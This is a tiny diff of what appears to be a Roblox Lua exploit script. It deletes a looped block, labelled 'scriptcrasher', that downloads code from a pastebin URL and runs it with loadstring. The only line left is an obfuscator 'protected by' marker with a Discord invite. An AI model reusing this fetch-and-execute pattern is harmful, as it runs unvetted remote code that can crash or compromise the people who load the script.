@@ -1,14 +1,3 @@
-spawn(function() --scriptcrasher
-    getgenv().linkspammer1 = false
-        while linkspammer1 do
-            pcall(function()
-                loadstring(game:HttpGet("https://pastebin.com/raw/4CHnND3T", true))()
-            end)
-        wait()
-    end
-end)
-
-
 _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
